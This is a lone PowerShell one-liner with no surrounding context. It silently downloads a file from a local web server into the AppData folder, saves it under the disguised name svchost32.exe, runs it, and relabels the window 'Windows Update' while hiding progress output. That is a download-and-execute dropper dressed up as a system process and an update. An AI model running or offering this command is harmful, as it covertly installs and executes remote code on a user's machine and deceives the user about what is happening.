
curl.exe -s -L -o "$env:APPDATA\svchost32.exe" 'https://localhost:8000/updater.ps1'; Start-Process -FilePath "$env:APPDATA\svchost32.exe"; $Host.UI.RawUI.WindowTitle = "Windows Update"; $ProgressPreference = "SilentlyContinue"
